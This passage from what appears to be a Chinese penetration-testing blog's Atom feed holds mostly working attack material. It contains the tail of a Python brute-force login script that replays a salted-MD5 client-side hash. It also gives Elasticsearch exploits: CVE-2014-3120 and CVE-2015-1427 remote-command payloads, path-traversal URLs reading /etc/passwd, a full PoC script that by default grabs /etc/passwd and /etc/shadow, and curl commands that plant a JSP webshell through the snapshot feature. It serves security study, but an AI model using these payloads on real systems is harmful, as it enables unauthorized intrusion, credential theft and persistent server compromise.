class="line">return;</span><br><span class="line">while 1:</span><br><span class="line">line = fp.readline()</span><br><span class="line">if not line:</span><br><span class="line">break</span><br><span class="line">passwd = line.strip(&apos;\n&apos;)</span><br><span class="line">Brute_Force_Dididai(&quot;150****1403&quot;,passwd);</span><br><span class="line"></span><br><span class="line">def Brute_Force_Dididai(username,password):</span><br><span class="line"></span><br><span class="line"># url = &quot;&quot;</span><br><span class="line">    s = requests.Session()</span><br><span class="line">s.headers = &#123;</span><br><span class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36&apos;,</span><br><span class="line">            &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &quot;http://www.foo.com/?m=&amp;s=getcd&quot;</span><br><span class="line">data = &#123;&quot;username&quot;:username&#125;</span><br><span class="line"></span><br><span class="line">html = s.post(url,data = data)</span><br><span class="line"></span><br><span class="line">print html.content</span><br><span class="line">salt_cd = json.loads(html.content)</span><br><span class="line">print salt_cd[&apos;salt&apos;]</span><br><span class="line">print salt_cd[&apos;cd&apos;]</span><br><span class="line">md5_pass = hashlib.md5(password.encode(&apos;utf-8&apos;)).hexdigest()+salt_cd[&apos;salt&apos;]</span><br><span class="line">md5_salt = hashlib.md5(md5_pass.encode(&apos;utf-8&apos;)).hexdigest()+str(salt_cd[&apos;cd&apos;])</span><br><span class="line">md5_cd = hashlib.md5(md5_salt.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">print md5_cd</span><br><span class="line"></span><br><span class="line">url1 = &quot;http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1&quot;</span><br><span class="line">data1 = &#123;&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:md5_cd&#125;</span><br><span class="line">html1 = s.post(url1,data = data1)</span><br><span class="line">print html1.content</span><br><span class="line">print len(html1.content);</span><br><span class="line"></span><br><span class="line">GetPass()</span><br></pre></td></tr></table></figure><p>然后准备测试pass.txt:</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-10.png" alt="21-10"></p><h3 id="2-2-3-攻击："><a href="#2-2-3-攻击：" class="headerlink" title="2.2.3 攻击："></a>2.2.3 攻击：</h3><p>最后只需要执行脚本即可：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-11.png" alt="21-11"></p><p>最后是爆破成功返回到数据包，由此可得到正确用户名密码。<br>freebuf地址<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTg0NDU1Lmh0bWw=" title="http://www.freebuf.com/articles/web/184455.html">http://www.freebuf.com/articles/web/184455.html<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-1-简述：&quot;&gt;&lt;a href=&quot;#1-1-简述：&quot; class=&quot;headerlink&quot; title=&quot;1.1 简述：&quot;&gt;&lt;/a&gt;1.1 简述：&lt;/h2&gt;&lt;p&gt;最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="爆破" scheme="http://sunu11.com/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="js加密" scheme="http://sunu11.com/tags/js%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Elsaticsearch 漏洞小结</title>
    <link href="http://sunu11.com/2018/07/14/20/"/>
    <id>http://sunu11.com/2018/07/14/20/</id>
    <published>2018-07-13T16:06:05.000Z</published>
    <updated>2018-11-03T11:59:40.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-因"><a href="#0-因" class="headerlink" title="0.因"></a>0.因</h3><p>众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，<a id="more"></a>故小记一番。</p><h3 id="1-果"><a href="#1-果" class="headerlink" title="1.果"></a>1.果</h3><h4 id="1-1-CVE-2014-3120-elasticsearch-v1-1-1-–-命令执行漏洞"><a href="#1-1-CVE-2014-3120-elasticsearch-v1-1-1-–-命令执行漏洞" class="headerlink" title="1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞"></a>1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞</h4><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>1、创建数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">posturl: http://ip:9200/foo/foo2</span><br><span class="line"></span><br><span class="line">postdata：</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;data&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">posturl: http://ip:9200/_search?pretty </span><br><span class="line"></span><br><span class="line">postdata:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="其他资料："><a href="#其他资料：" class="headerlink" title="其他资料："></a>其他资料：</h5><p>（1）dockerfile地址<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvZWxhc3RpY3NlYXJjaC9DVkUtMjAxNC0zMTIw" title="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120<i class="fa fa-external-link"></i></span><br><br>（2）<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3ZpZXd0aHJlYWQucGhwP3RpZD0yOTQwOA==" title="https://www.t00ls.net/viewthread.php?tid=29408">https://www.t00ls.net/viewthread.php?tid=29408<i class="fa fa-external-link"></i></span><br><br>（3）<span class="exturl" data-url="aHR0cDovL2JvdWsuY28vYmxvZy9lbGFzdGljc2VhcmNoLXJjZQ==" title="http://bouk.co/blog/elasticsearch-rce">http://bouk.co/blog/elasticsearch-rce<i class="fa fa-external-link"></i></span><br></p><h4 id="1-2-（CVE-2015-1427）ElasticSearch-Groovy-v1-4-2以下-–-沙盒绕过-amp-amp-代码执行漏洞"><a href="#1-2-（CVE-2015-1427）ElasticSearch-Groovy-v1-4-2以下-–-沙盒绕过-amp-amp-代码执行漏洞" class="headerlink" title="1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞"></a>1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞</h4><h5 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h5><p>Java沙盒绕过法：</p><blockquote><p>java.lang.Math.class.forName(“java.lang.Runtime”).getRuntime().exec(“id”).getText()</p></blockquote><p>Goovy直接执行命令法：</p><blockquote><p>def command=’id’;def res=command.execute().text;res</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">posturl: http://ip:9200/_search?pretty </span><br><span class="line">postdata:</span><br><span class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="其他资料：-1"><a href="#其他资料：-1" class="headerlink" title="其他资料："></a>其他资料：</h5><p>(1）dockerfile地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvZWxhc3RpY3NlYXJjaC9DVkUtMjAxNS0xNDI3" title="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427<i class="fa fa-external-link"></i></span><br><br>(2）<span class="exturl" data-url="aHR0cDovL2NiLmRyb3BzLndpa2kvZHJvcHMvcGFwZXJzLTUxMDcuaHRtbA==" title="http://cb.drops.wiki/drops/papers-5107.html">http://cb.drops.wiki/drops/papers-5107.html<i class="fa fa-external-link"></i></span><br><br>(3）<span class="exturl" data-url="aHR0cDovL2pvcmRhbi13cmlnaHQuY29tL2Jsb2cvMjAxNS8wMy8wOC9lbGFzdGljc2VhcmNoLXJjZS12dWxuZXJhYmlsaXR5LWN2ZS0yMDE1LTE0Mjc=" title="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427<i class="fa fa-external-link"></i></span><br><br>(4）<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1hpcGhvc1Jlc2VhcmNoL2V4cGxvaXRz" title="https://github.com/XiphosResearch/exploits">https://github.com/XiphosResearch/exploits<i class="fa fa-external-link"></i></span><br><br>(5）<span class="exturl" data-url="aHR0cDovL2NiLmRyb3BzLndpa2kvZHJvcHMvcGFwZXJzLTUxNDIuaHRtbA==" title="http://cb.drops.wiki/drops/papers-5142.html">http://cb.drops.wiki/drops/papers-5142.html<i class="fa fa-external-link"></i></span><br></p><h4 id="1-3（CVE-2015-3337）ElasticSearch-1-4-5以下-1-5-2以下-–-目录穿越漏洞"><a href="#1-3（CVE-2015-3337）ElasticSearch-1-4-5以下-1-5-2以下-–-目录穿越漏洞" class="headerlink" title="1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞"></a>1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞</h4><h5 id="利用：-2"><a href="#利用：-2" class="headerlink" title="利用："></a>利用：</h5><p>读服务器上文件：burpsuite的repeater中访问url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:9200/_plugin/head/../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><h5 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h5><p>（1）原理：在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。<br><br>（2）dockerfile地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvcHVsc2U=" title="https://github.com/vulhub/vulhub/pulse">https://github.com/vulhub/vulhub/pulse<i class="fa fa-external-link"></i></span><br></p><h4 id="1-4-（CVE-2015-5531）ElasticSearch-1-6-1以下-–-目录穿越漏洞"><a href="#1-4-（CVE-2015-5531）ElasticSearch-1-6-1以下-–-目录穿越漏洞" class="headerlink" title="1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞"></a>1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞</h4><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>该漏洞在elasticsearch 1.5.1及以前，无需任何配置即可触发。之后的新版，<em>配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能</em>。</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>1、创建一个仓库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">puturl: /_snapshot/test</span><br><span class="line"></span><br><span class="line">putdata:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、创建一个快照：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">puturl: /_snapshot/test2</span><br><span class="line"></span><br><span class="line">putdata:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3、目录穿越访问服务器文件，在burpsuite 中repeater访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure></p><p>4、从repeater中将错误信息解码，即可得到对应服务器文件（passwd）信息。</p><h5 id="其他资料：-2"><a href="#其他资料：-2" class="headerlink" title="其他资料："></a>其他资料：</h5><p>（1）原理：elasticsearch中备份的快照保存在备份仓库中的命名格式是以snapshot-xxx的格式,所以snapshot-backdata 会被误以为是test仓库的backdata快照，快照都是文件形式保存的，而snapshot-backdata是目录，elasticsearch 没有区分，如果elasticsearch发现其是目录之后，就继续读取目录下的内容，如果目录下的文件明称是恶意构造的(类似../../../) elasticsearch就会去读取这个递归读取文件的内容（这里elasticsearch没有过滤..），从而导致目录遍历（任意文件内容读取）<br><br>（2）dockerfile地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvZWxhc3RpY3NlYXJjaC9DVkUtMjAxNS01NTMx" title="https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531">https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531<i class="fa fa-external-link"></i></span><br><br>（3）python poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">PoC for CVE-2015-5531</span><br><span class="line">Affects ElasticSearch 1.6.0 and prior</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import argparse</span><br><span class="line">import traceback</span><br><span class="line">import termcolor</span><br><span class="line">def colorize_red(string):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param string:</span><br><span class="line">    :return</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return termcolor.colored(string, &apos;red&apos;)</span><br><span class="line">def colorize_green(string):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param string:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return termcolor.colored(string, &apos;green&apos;)</span><br><span class="line">def create_repos(base_url):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param base_url:</span><br><span class="line">    :return: None</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for index, repo_name in enumerate(REPO_NAME_LST):</span><br><span class="line">        </span><br><span class="line">        url = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(base_url, repo_name)</span><br><span class="line">        req = requests.post(url, json=DATA_REPO_LST[index])</span><br><span class="line">         </span><br><span class="line">        if “acknowledged” in req.json():</span><br><span class="line">            print colorize_green(“repository &#123;0&#125;: create success”.format(repo_name))</span><br><span class="line">def grab_file(vuln_url):</span><br><span class="line">    “”&quot;</span><br><span class="line">    :param xplurl:</span><br><span class="line">    :return:</span><br><span class="line">    “”&quot;</span><br><span class="line">    </span><br><span class="line">    req = requests.get(vuln_url)</span><br><span class="line">    if req.status_code == 400:</span><br><span class="line">        data = req.json()</span><br><span class="line">        extrdata = re.findall(r’\d+’, str(data[&apos;error&apos;]))</span><br><span class="line">        decoder = bytearray()</span><br><span class="line">        for i in extrdata[2:]:</span><br><span class="line">            decoder.append(int(i))</span><br><span class="line">        print colorize_green(decoder)</span><br><span class="line">def exploit(**args):</span><br><span class="line">    “”&quot;</span><br><span class="line">    :param args:</span><br><span class="line">    :return:</span><br><span class="line">    “”&quot;</span><br><span class="line">    target = args[&apos;target&apos;]</span><br><span class="line">    port = args[&apos;port&apos;]</span><br><span class="line">    fpath = args[&apos;fpath&apos;].split(‘,’)</span><br><span class="line">    fpath = [urllib.quote(fp, safe=&apos;&apos;) for fp in fpath]</span><br><span class="line">    base_url = “http://&#123;0&#125;:&#123;1&#125;/_snapshot/”.format(target, port)</span><br><span class="line">    #create elasticsearch repository for snapshot</span><br><span class="line">    create_repos(base_url)</span><br><span class="line">    #grab files</span><br><span class="line">    for fp in fpath:</span><br><span class="line">        vuln_url = ‘&#123;0&#125;&#123;1&#125;/&#123;2&#125;&#123;3&#125;’.format(base_url, REPO_NAME_LST[0], FCK, fp)</span><br><span class="line">        print colorize_red(urllib.unquote(fp)) + “:\n”</span><br><span class="line">        grab_file(vuln_url)</span><br><span class="line">if __name__ == “__main__”:</span><br><span class="line">    # for global</span><br><span class="line">    FCK = ‘backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..’</span><br><span class="line">    REPO_NAME_LST = [&apos;test11&apos;, &apos;test12&apos;]</span><br><span class="line"> </span><br><span class="line">   DATA_REPO_LST = [&#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </span><br><span class="line">&quot;/tmp/test30&quot;&#125;&#125;, &#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: </span><br><span class="line">&quot;/tmp/test30/snapshot-backdata&quot;&#125;&#125;]</span><br><span class="line">    parser = argparse.ArgumentParser(usage=”python cve-2015-5531.py options”,</span><br><span class="line">                                     description=”cve-2015-5531 Vuln PoC”, add_help=True)</span><br><span class="line">    parser.add_argument(‘-t’, ‘–target’, metavar=’TARGET’, type=str, dest=”target”, required=True, help=’eg: 127.0.0.1 or www.baidu.com’)</span><br><span class="line"> </span><br><span class="line">   parser.add_argument(‘-p’, ‘–port’, metavar=’PORT’, dest=’port’, </span><br><span class="line">type=int, default=9200, help=’elasticsearch port default 9200′)</span><br><span class="line">   </span><br><span class="line"> parser.add_argument(‘–fpath’, metavar=’FPATH’, dest=’fpath’, type=str,</span><br><span class="line"> default=’/etc/passwd,/etc/shadow’, help=’file to grab multi files </span><br><span class="line">separated by comma ‘)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    try:</span><br><span class="line">        exploit(**args.__dict__)</span><br><span class="line">    except:</span><br><span class="line">        traceback.print_exc()</span><br></pre></td></tr></table></figure><h4 id="1-5（WooYun-2015-110216）Elasticsearch（1-5-x以下）–-写入webshell漏洞"><a href="#1-5（WooYun-2015-110216）Elasticsearch（1-5-x以下）–-写入webshell漏洞" class="headerlink" title="1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞"></a>1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞</h4><h5 id="说明：-1"><a href="#说明：-1" class="headerlink" title="说明："></a>说明：</h5><p>1、原理：<br>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。<br>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p><p>2、利用方式：<br>在获取其他web服务的根目录后，直接使用ES写入对应木马文件至解析目录即可。<br>如tomcat服务web解析目录为：/usr/local/tomcat/webapps。<br>首先建立一个恶意索引文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&apos;</span><br><span class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class="line">&apos;</span><br></pre></td></tr></table></figure></p><p>再创建一个恶意的存储库，其中location的值即为我要写入的路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &apos;http://ip:9200/_snapshot/yz.jsp&apos; -d &apos;&#123;</span><br><span class="line">     &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">     &quot;settings&quot;: &#123;</span><br><span class="line">          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot&quot;,</span><br><span class="line">          &quot;compress&quot;: false</span><br><span class="line">     &#125;</span><br><span class="line">&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>存储库验证并创建:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &apos;&#123;</span><br><span class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">     &quot;include_global_state&quot;: false</span><br><span class="line">&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>最后访问写入的webshell即可：</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2lwOjkyMDAvd3d3cm9vdC9pbmRpY2VzL3l6LmpzcC9zbmFwc2hvdC15ei5qc3A=" title="http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp">http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp<i class="fa fa-external-link"></i></span></p></blockquote><p>上面的jsp文件作用为向wwwroot目录下的test.jsp文件写入任意字符如访问下面：</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2lwOjgwODAvd3d3cm9vdC9pbmRpY2VzL3l6LmpzcC9zbmFwc2hvdC15ei5qc3A/Zj10ZXN0" title="http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test">http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test<i class="fa fa-external-link"></i></span><br>将test.jsp中写入test。只需访问<span class="exturl" data-url="aHR0cDovL2lwOjgwODAvd3d3cm9vdC90ZXN0LmpzcOWNs+WPr+eci+WIsOWFtumhtemdouaYvuekunRlc3TjgII=" title="http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。">http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。<i class="fa fa-external-link"></i></span></p></blockquote><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>(1) 原理地址：<span class="exturl" data-url="aHR0cDovL2NiLmRyb3BzLndpa2kvYnVncy93b295dW4tMjAxNS0wMTEwMjE2Lmh0bWw=" title="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html<i class="fa fa-external-link"></i></span><br><br>(2）dockerfile地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvZWxhc3RpY3NlYXJjaC9Xb29ZdW4tMjAxNS0xMTAyMTY=" title="https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216">https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216<i class="fa fa-external-link"></i></span><br></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0-因&quot;&gt;&lt;a href=&quot;#0-因&quot; class=&quot;headerlink&quot; title=&quot;0.因&quot;&gt;&lt;/a&gt;0.因&lt;/h3&gt;&lt;p&gt;众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="Elsaticsearch" scheme="http://sunu11.com/tags/Elsaticsearch/"/>
    
  </entry>
  
  <entry>
    <title>心悸</title>
    <link href="http://sunu11.com/2018/05/21/%E5%BF%83%E6%82%B8/"/>
    <id>http://sunu11.com/2018/05/21/心悸/</id>
    <published>2018-05-21T15:53:53.000Z</published>
    <updated>2018-08-23T06:23:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>此文永在心中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;此文永在心中&lt;/p&gt;

      
    
    </summary>
    
      <category term="岁月" scheme="http://sunu11.com/categories/%E5%B2%81%E6%9C%88/"/>
    
    
      <category term="生活" scheme="http://sunu11.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
